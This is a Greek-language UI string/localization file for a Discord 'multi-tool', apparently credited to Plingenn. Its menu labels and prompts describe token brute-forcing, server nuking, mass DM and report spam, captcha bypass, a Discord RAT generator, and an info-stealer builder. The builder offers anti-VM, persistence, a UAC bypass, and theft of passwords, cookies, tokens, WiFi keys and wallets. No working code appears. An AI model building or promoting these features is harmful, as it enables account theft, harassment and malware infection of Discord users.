Πληροφορίες Token{end_space8}
Είσοδος με Token{end_space10}
Καταστροφέας Token{end_space7}
Κατασκοπευτής Token{end_space6}
Απενεργοποιητής Token{end_space4}
Επίθεση Βίας Token{end_space7}
Ψεύτικος Γραφέας{end_space9}
Κυνηγός Vanity{end_space11}
Ομαδική συνομιλία Spammer
Αποκλεισμός Φίλων{end_space8}
Αφαίρεση Φίλων{end_space16}
Αφαίρεση Αιτήσεων Φιλίας{end_space1}
Δημιουργία Διακομιστών{end_space3}
Αλλαγή Προφίλ{end_space12}
Κατασκοπευτής QR Κωδικών{end_space1}
Bot Discord Rat{end_space10}
Πατητής Κουμπιών{end_space9}
Αντιδραστήρας Μηνυμάτων{end_space2}
Μαζική Αποστολή DM{end_space7}
Μαζική Αναφορά{end_space11}
Μαζική Προσθήκη Φίλων{end_space4}
Διαγραφή DM{end_space14}
Εκκαθάριση DM{end_space12}
Παράκαμψη Κανόνων{end_space8}
Παράκαμψη RestoreCord{end_space4}
Παράκαμψη Sledge Hammer{end_space2}
Εργαλείο Webhook{end_space9}
από τον Plingenn{end_space9}
Αλλαγολόγιο{end_space14}
Ρυθμίσεις{end_space16}
Συνομιλία
Διαχείριση Token
Επόμ Σελίδα
Τρέχει σε:{end_space11}
Μη έγκυρη επιλογή, παρακαλώ δοκιμάστε ξανά!
Διακόπηκε από το χρήστη.
Αλλαγή Θέματος
Ρυθμίσεις Λογαριασμού
Ρυθμίσεις Proxy
Ρυθμίσεις Εμφάνισης
Εναλλαγή Λειτουργίας Αποσφαλμάτωσης
Διαχειριστικό Πίνακα
Μη έγκυρη ρύθμιση
ΚΥΑΝΟ
ΜΠΛΕ
ΠΡΑΣΙΝΟ
ΚΟΚΚΙΝΟ
ΛΕΥΚΟ
ΚΙΤΡΙΝΟ
ΜΑΤΖΕΝΤΑ
ΑΝΟΙΧΤΟ ΚΟΚΚΙΝΟ
ΑΝΟΙΧΤΟ ΜΠΛΕ
ΑΝΟΙΧΤΟ ΠΡΑΣΙΝΟ
ΑΝΟΙΧΤΟ ΚΥΑΝΟ
ΑΝΟΙΧΤΟ ΜΑΥΡΟ
Το θέμα ορίστηκε σε
Επισκόπηση Λογαριασμού
Η Άδειά Μου
Ιστορικό Αγορών
Εξαργύρωση Κωδικού
Λήψη Λογισμικού
Όνομα Χρήστη
Δημιούργησε το
Αλλαγή Ονόματος Χρήστη
Αποσύνδεση
Η αλλαγή ονόματος απέτυχε, το όνομα χρήστη πρέπει να περιέχει τουλάχιστον 3 χαρακτήρες.
Θέλετε να αποσυνδεθείτε από τον λογαριασμό σας; (Ν/Ο)
Προϊόν
Λήγει σε
Ημερομηνία
Εισαγάγετε τον κωδικό προϊόντος σας για να λάβετε το περιεχόμενό σας.
Κωδικός
Έχετε ήδη εξαργυρώσει τον κωδικό.
Βεβαιωθείτε ότι αποθηκεύσατε το προϊόν σας πριν πατήσετε το Enter!
Ο κωδικός δεν βρέθηκε στην απάντηση
Αποτυχία ανάκτησης δεδομένων για τον παρεχόμενο κωδικό
Η διεύθυνση URL δεν βρέθηκε στις πληροφορίες του κωδικού
Μη έγκυρος κωδικός!
Εναλλαγή Χρήσης Proxy
Καθαρισμός Κρυφού Προξενιού
Προσθήκη Δικών Σας Προξενιών στη Μνήμη Cache
Σκανάρισμα Προξενιού
Μη Έγκυρη Επιλογή
Απενεργοποίηση Λειτουργίας Αποσφαλμάτωσης {RED}
Ενεργοποίηση Λειτουργίας Αποσφαλμάτωσης {GREEN}
Προστέθηκε νέο Σύστημα Πιστοποίησης
Βελτιωμένο Σύστημα Διαμόρφωσης
Ανασχεδιασμός Διαδραστικής Διεπαφής
Προστέθηκε σύστημα συνομιλίας
Προστέθηκαν νέες ρυθμίσεις λογαριασμού
Υλοποιήθηκε η μνήμη cache για καλύτερη απόδοση
Προσαρμοσμένη Απομακρυσμένη Ενσωμάτωση Discord
Εναλλαγή Απομακρυσμένης Ενσωμάτωσης Discord
Εναλλαγή Προσαρμοσμένης Απομακρυσμένης Ενσωμάτωσης Discord
Επεξεργασία Προσαρμοσμένης Απομακρυσμένης Ενσωμάτωσης Discord
Απενεργοποίηση Προσαρμοσμένης Απομακρυσμένης Ενσωμάτωσης Discord
Ενεργοποίηση Προσαρμοσμένης Απομακρυσμένης Ενσωμάτωσης Discord
Λεπτομέρειες (Απαιτούμενο)
Οι λεπτομέρειες πρέπει να είναι τουλάχιστον 3 χαρακτήρες μακριά.
Κατάσταση (Απαιτούμενο)
Η κατάσταση πρέπει να είναι τουλάχιστον 3 χαρακτήρες μακριά.
URL μεγάλης εικόνας (Προαιρετικό)
Μεγάλο κείμενο (Προαιρετικό)
URL μικρής εικόνας (Προαιρετικό)
Μικρό κείμενο (Προαιρετικό)
Πόσα κουμπιά θέλετε να έχετε;
Εισαγωγή ετικέτας για το κουμπί
Εισαγωγή URL για το κουμπί
Μη έγκυρη μορφή URL. Παρακαλώ εισάγετε ένα έγκυρο URL.
Μη έγκυρος αριθμός κουμπιών. Παρακαλώ εισάγετε έναν αριθμό μεταξύ 0 και 2.
Το Discord RPC απενεργοποιήθηκε
Το Discord RPC ενεργοποιήθηκε
Κανονική Λειτουργία
Λειτουργία RestoreCord (παράκαμψη captcha)
Έλεγχος Cache
Προσαρμοσμένος Έλεγχος
Έλεγχος Διακομιστή
Εισαγωγή προσαρμοσμένης διαδρομής για φόρτωση των τοκεν από
Κανονική Συνομιλία
Υποστηριζόμενη Συνομιλία (Μη Διαθέσιμη)
Ιδιωτική Συνομιλία (Μη Διαθέσιμη)
Αναζήτηση Διακομιστή{end_space5}
Κλώνος Διακομιστή{end_space8}
Καταστροφή Διακομιστή{end_space4}
Συγχώνευση Τοκεν{end_space9}
Αποχώρηση Τοκεν{end_space10}
Διακομιστής Ανεπιθύμητων{end_space1}
Προσβολή{end_space17}
Σπαμάρισμα Στο SoundBoard
Ενώστε τη φωνή{end_space11}
Αλλαγή Εικόνας Προφίλ{end_space8}
αγκόσμια Ψευδώνυμα Αλλαγή
Αλλαγή Ψευδωνύμου Διακομιστή
Αλλαγή HypeSquadv{end_space8}
Αντωνυμίες Changer{end_space7}
Αλλαγή Γλώσσας{end_space11}
Αλλαγή Κατάστασης{end_space8}
Αλλαγή Θέματος{end_space11}
Αλλαγή Βιογραφίας{end_space8}
Δημιουργός Λογαριασμού{end_space3}
Δημιουργός VideoCrash{end_space4}
Κύκλος Ρυθμίσεων{end_space13}
Σημειώσεις Ενημέρωσης{end_space4}
Τηλεγραφήματα{end_space12}
Προσωπικό Ρομπότ{end_space9}
Github{end_space19}
Σχετικά{end_space18}
Έξοδος{end_space19}
Προηγ. Σελίδα{end_space2}
Ονόματα Διακομιστών
Μήνυμα
Αριθμός Νημάτων
Παρουσιάστηκε ένα σφάλμα:
Δεν βρέθηκαν τοκεν στην μνήμη cache
Εκτόξευση του Rain Nuke
Το Rain Nuke έχει εκτοξευθεί. . .
Αποστολή Μηνύματος
ID Μηνύματος:
Στάλθηκε ένα μήνυμα σε όλους τους διαθέσιμους φίλους.
Αποχώρηση από διακομιστή:
Διαγραφή διακομιστή:
Συναντήθηκε το παρακάτω σφάλμα και αγνοήθηκε:
Διαγραφή/Αποχώρηση από όλους τους διαθέσιμους διακομιστές.
Αφαίρεση φίλου:
Αφαιρέθηκε φίλος:
Αφαιρέθηκαν όλοι οι διαθέσιμοι φίλοι.
Δημιουργία
Δημιουργήθηκε
Δημιουργήθηκαν όλοι οι διακομιστές.
Το Rain Nuke εκρήγνυται με επιτυχία!
Με επιτυχία μετατράπηκε σε ένα Reme Wasteland
Εισάγετε οτιδήποτε για να συνεχίσετε. . .
Έναρξη λειτουργίας επιληψίας (Εναλλαγή αναμεταξύ φωτεινού/σκοτεινού λειτουργίας)
Δεν υπάρχουν αρκετοί φίλοι για να προχωρήσετε.
Παρουσιάστηκε ένα σφάλμα κατά την επεξεργασία του τοκεν
Σπαμμέρ καναλιού
ID Καναλιού
Παράκαμψη Κανόνων
ID Διακομιστή
Πλαστός Γραφολόγος
Καθολικός Σημαδευτής
Όνομα Χρήστη
Σημαδευτής Διακομιστή
Αλλαγή Προσωπικών Αντωνυμιών
Τυχαίες Προσωπικές Αντωνυμίες (ναι/όχι)
Προσωπικές Αντωνυμίες
Διαγραμμένο DM:
Δεν υπάρχουν αρκετά DM για να προχωρήσετε.
Διακόπηκε ο κύκλος
Σπαμμέρ Πίνακας Ήχου
Το πρόγραμμα διακόπηκε από τον χρήστη.
Αποτυχία αποστολής παλμού με το τοκεν:
Αποτυχία συμμετοχής σε VC με το τοκεν:
Συμμετοχή σε VC με τα Τοκεν..
Επιτυχής ενημέρωση πρόσκλησης, ο διακομιστής σας μπορεί τώρα να προσπελαστεί από
Αποτυχία ενημέρωσης του vanity url. Κωδικός κατάστασης:
Κωδικός vanity για επίθεση
Αναγνωριστικό διακομιστή για εφαρμογή του vanity
Καθυστέρηση μεταξύ ελέγχων (δευτερόλεπτα)
Η λειτουργία Vanity Sniper έχει ξεκινήσει. Πιέστε Ctrl+C για να σταματήσετε.
Σφάλμα:
Διακομιστής Webhook
Διαγραφή Διακομιστή Webhook
Διακομιστής Webhook
Ο Διακομιστής Webhook διαγράφηκε επιτυχώς
Διαχειριστής Τοκεν
Αποθήκευση Τοκεν
Εκκαθάριση Τοκεν
Έλεγχος Τοκεν και Αποθήκευση μόνο των Έγκυρων (ν/ο)
Οι Τοκεν Cache Αδειάστηκαν.
Εισάγετε τη διαδρομή προς το αρχείο κειμένου που περιέχει τα τοκεν
Δεν βρέθηκαν τοκεν στο συγκεκριμένο αρχείο κειμένου
Έλεγχος Τοκεν
Απέτυχε η λήψη ονόματος διακομιστή:
Συμμετοχή
Βίαιη δύναμη του τοκεν της βροχής. PS: Αυτό μπορεί να πάρει πολύ χρόνο για να λειτουργήσει.
Αν είστε εξαιρετικά τυχεροί και μπορείτε να πάρετε το τοκεν κάποιου, θα το ανακαλύψετε αποθηκευμένο στο 'brute-force.txt'.
Ζητήστε πάντα ρητή άδεια από το άτομο πριν από την εκτέλεση μιας επίθεσης βίαιης δύναμης στο λογαριασμό τους.
Μη έγκυρο αναγνωριστικό χρήστη, παρακαλώ δοκιμάστε ξανά!
Έγκυρο
Μη Έγκυρο
Σφάλμα κατά τη λήψη πηγών χρέωσης:
Σφάλμα κατά τη λήψη δεδομένων nitro:
Δεν υπάρχουν διαθέσιμες πληροφορίες χρέωσης.
Συλλογή πληροφοριών χρήστη & Webdrivers..
Όνομα Αρχείου
Κωδικός Αρχείου
Θέλετε να παρέχετε ένα αρχείο εικονιδίου; (Ν/Ο)
Μη έγκυρη διαδρομή ή URL εικονιδίου. Ορισμός εικονιδίου σε Κενό.
Κάντε μου Ping (Ν/Ο)
Αντί-VM (Ν/Ο)
Τοποθέτηση στην Εκκίνηση (Ν/Ο)
Παράκαμψη UAC (Ν/Ο)
Λιώσιμο (Ν/Ο)
Απόκρυψη Κονσόλας (Ν/Ο)
Καταγραφή Κάμερας (Ν/Ο)
Καταγραφή Κωδικών (Ν/Ο)
Καταγραφή Cookies (Ν/Ο)
Καταγραφή Αυτόματων συμπληρώσεων (Ν/Ο)
Καταγραφή Ιστορικού (Ν/Ο)
Καταγραφή Tokens Discord (Ν/Ο)
Καταγραφή Παιχνιδιών (Ν/Ο)
Καταγραφή Κωδικών WiFi (Ν/Ο)
Καταγραφή Πληροφοριών Συστήματος (Ν/Ο)
Καταγραφή Στιγμιότυπου (Ν/Ο)
Καταγραφή Telegram (Ν/Ο)
Καταγραφή Κοινών Αρχείων (Ν/Ο)
Καταγραφή Πορτοφολιών (Ν/Ο)
Ψευδοσφάλμα (Ν/Ο)
Τίτλος Ψευδοσφάλματος
Μήνυμα Ψευδοσφάλματος
Αποκλεισμός Ανεπιθύμητων Ιστότοπων (Ν/Ο)
Εισαγωγή Discord (Ν/Ο)
Εικονίδιο Αρχείου
Δημιουργώντας {name}.exe, Αυτό θα πάρει λίγα δευτερόλεπτα. Ευχαριστούμε για την υπομονή σας!
Το αρχείο είναι στο {path}
Δημιουργήθηκε groupchat
Περιορισμένος ρυθμός ({response.json()['retry_after']}ms)
Δεν υπάρχουν αρκετοί φίλοι διαθέσιμοι για τυχαία επιλογή
Θέλετε να επιλέξετε μόνοι σας τους χρήστες για την αποστολή spam στο groupchat ή θέλετε να επιλέξετε τυχαίους;
Επιλέξτε τους χρήστες μόνοι σας
Τυχαία επιλογή χρηστών
Δημιουργία groupchats
Αναγνωριστικά χρηστών
Δεν είχατε κανένα κόμμα (,) η μορφή είναι id,id2,id3
σε οποιαδήποτε στιγμή για να σταματήσετε
Αποκλεισμένο:
Σφάλμα κατά τη λήψη σχέσεων:
Δεν υπάρχουν αρκετά αιτήματα φίλων για να συνεχίσετε.
Εισερχόμενο Αίτημα Φίλου Από:
Αφαιρούμενο Αίτημα Φίλου Από:
Συνολικά Αιτήματα Φίλων Αφαιρέθηκαν:
Παρουσιάστηκε σφάλμα κατά τη δημιουργία {server_name}: {e}
εικονίδιο για τους διακομιστές ναι/όχι
Τυχαία ονόματα διακομιστών
Προσαρμοσμένα ονόματα διακομιστών
Όνομα των διακομιστών που θα δημιουργηθούν
Εισαγωγή της τοποθεσίας του εικονιδίου
Δεν μπόρεσε να βρει το "{image}" στον υπολογιστή σας
Προσαρμοσμένη κατάσταση
Προσαρμοσμένο βιογραφικό
Δημιουργία αρχείου... {i}
Εγγραφή Αρχείου... {i}
Σημείωση: Αυτός ο κώδικας δεν είναι πλήρως λειτουργικός αυτήν την στιγμή, αλλά είναι εξακολουθεί να εκτελείται.\nΩστόσο, μπορεί να συναντήσετε σφάλματα ή προβλήματα.
Εισαγάγετε το όνομα που θέλετε να δώσετε στο τελικό αρχείο
Εισάγετε το τοκεν του bot που θα χρησιμοποιήσετε για να εκτελέσετε τις εντολές RAT
Τοκεν Bot
Εισαγάγετε το αναγνωριστικό του διακομιστή στον οποίο είναι εγγεγραμμένες οι εντολές κοπής
Σφάλμα εγγραφής αρχείου: {e}
Το αρχείο έχει γραφτεί σωστά στο "output/{fileName}.py"
Μετατρέψτε το σε εκτελέσιμο (Ν/Ο)
Δημιουργία αρχείου...
Καθαρισμός παλαιών αρχείων...
Το εκτελέσιμο αρχείο έχει δημιουργηθεί σωστά
Παρουσιάστηκε σφάλμα HTTP: {e}
Αναγνωριστικό μηνύματος
Επιλέξτε το κουμπί που θέλετε να πατήσετε
{r}({LIGHTBLACK_EX}{i}{r}) Όνομα: {LIGHTBLACK_EX}{button_label}{r} , Προσαρμοσμένο ID: {LIGHTBLACK_EX}{button_custom_id}
Κουμπί
Βρέθηκε μόνο ένα κουμπί στο μήνυμα.
Αποτυχία προσθήκης αντίδρασης {reaction} στο μήνυμα {message_id}. Έχει ήδη επιτευχθεί το μέγιστο αριθμό αντιδράσεων.
Έχει ήδη επιτευχθεί ο μέγιστος αριθμός αντιδράσεων.
Αποτυχία προσθήκης αντίδρασης {reaction} στο μήνυμα {message_id}. Απαγορεύεται: {error_message}
Αντικείμενα
Πρόσωπα
Ζώα
Σύμβολα
Δεν βρέθηκαν emojis στην απάντηση
Αποτυχία ανάκτησης emojis από το API
Σύνδεσμος πρόσκλησης
Μη έγκυρη μορφή συνδέσμου πρόσκλησης.
Παρουσιάστηκε σφάλμα κατά την αποστολή του αιτήματος
Πληροφορίες πρόσκλησης:
Πληροφορίες προσκεκλημένου:
Πληροφορίες διακομιστή:
Κανάλι
Ημερομηνία λήξης
ID χρήστη
Εμβλήματα
Μη διαθέσιμο
Όνομα
ID διακομιστή
Περιγραφή
Σημαιακό
Σημαιακό URL
Σημαιακό URL (Μη διαθέσιμο)
Vanity URL
Επίπεδο επαλήθευσης
Splash
Splash URL
Splash URL (Μη διαθέσιμο)
Χαρακτηριστικά
Ξεκίνησε η Κρίση. Πατήστε Ctrl+C για να σταματήσετε.
Διακόπηκε η Κρίση
Ξεκίνησε η αλλαγή γλώσσας. Πατήστε Ctrl+C για να σταματήσετε.
Μη έγκυρο Token.
Πατήστε ENTER για να συνεχίσετε
Πολυεργαλείο Discord | https://discord.gg/N4NvXTnQe3 | Δημιουργήθηκε από Plingenn
Ρυθμίσεις Εμφάνισης
Ρυθμίσεις Κειμένου
Ρυθμίσεις Δρομέα
Ρυθμίσεις Διαφάνειας
Ρυθμίσεις Παραθύρου
Ρυθμίσεις Γλώσσας
Χρωματικό Σχήμα
Γραμματοσειρά
Μέγεθος Γραμματοσειράς
Ύψος Γραμμής
Βάρος Γραμματοσειράς
Ρετρό Εφέ Τερματικού
Ρυθμίσεις Χρώματος
Ρυθμίσεις Γραμματοσειράς
Ρυθμίσεις Μεγέθους Γραμματοσειράς
Ρυθμίσεις Ύψους Γραμμής
Ρυθμίσεις Βάρους Γραμματοσειράς
Ρυθμίσεις Ρετρό
Ρυθμίσεις Δρομέα
Η γλώσσα ορίστηκε σε {chosen_language}
Ανώνυμο
Τύπος
Σπίτι
Σύνδεσμος μηνύματος
Μη έγκυρος σύνδεσμος μηνύματος
Επιστροφή...
Απέτυχε η σύνδεση στο Discord RPC: {e}
Επιλογή
Θέμα
Ρύθμιση
Επεξεργασία
Γλώσσα
Διαφάνεια Πάνελ
Μη έγκυρη Διαφάνεια
Ρυθμίσεις Παραθύρου
Αυτή η επιλογή είναι υπό κατασκευή
Αυτή η επιλογή δεν είναι διαθέσιμη αυτήν τη στιγμή. Παρακαλώ είστε υπομονετικοί καθώς θα προστεθεί αργότερα.
Αυτή η επιλογή δεν είναι διαθέσιμη αυτήν τη στιγμή.
Θα αντικατασταθεί σε μία από τις επόμενες ενημερώσεις με: '{replacement}'.
Αυτή η επιλογή δεν είναι διαθέσιμη
Αυτές οι επιλογές είναι υπό ανάπτυξη
Αυτές οι επιλογές βρίσκονται υπό ανάπτυξη αλλά παραμένουν χρήσιμες. Ωστόσο, είναι πιθανό να προκύψουν σφάλματα ή σφάλματα.
Απέτυχε η λήψη αντωνυμιών από {pronounce_url} ({statuscode})
Η χρήση προξενιού δεν είναι προς το παρόν διαθέσιμη. Ζητούμε συγγνώμη για την ταλαιπωρία. Θα γίνει προσβάσιμη σε μία από τις επόμενες ενημερώσεις μας.
Η χρήση προξενιού απενεργοποιήθηκε {RED}ΑΠΕΝΕΡΓΟΠΟΙΗΜΕΝΟ
Η χρήση προξενιού απενεργοποιήθηκε {GREEN}ΕΝΕΡΓΟΠΟΙΗΜΕΝΟ
Επιτυχής εγγραφή νέων προξενιών
Επιτυχής ανάκτηση προξενιών
Ολοκληρώθηκε! Ανακτήθηκαν {proxies} συνολικά => {temp} | {execution_time}ms
ΥΠ{end_space4}
Εφαρμόστηκε πολυγλωσσική υποστήριξη.
Μαζική συζήτηση{end_space10}
Spammer φόρουμ
Μαζικό DM προς χρήστες{end_space3}
Μη διαθέσιμο{end_space13}
Ενισχυτής διακομιστή{end_space10}
Διαδικτυακός με Token{end_space4}
Δημιουργός δημοσκοπήσεων{end_space1}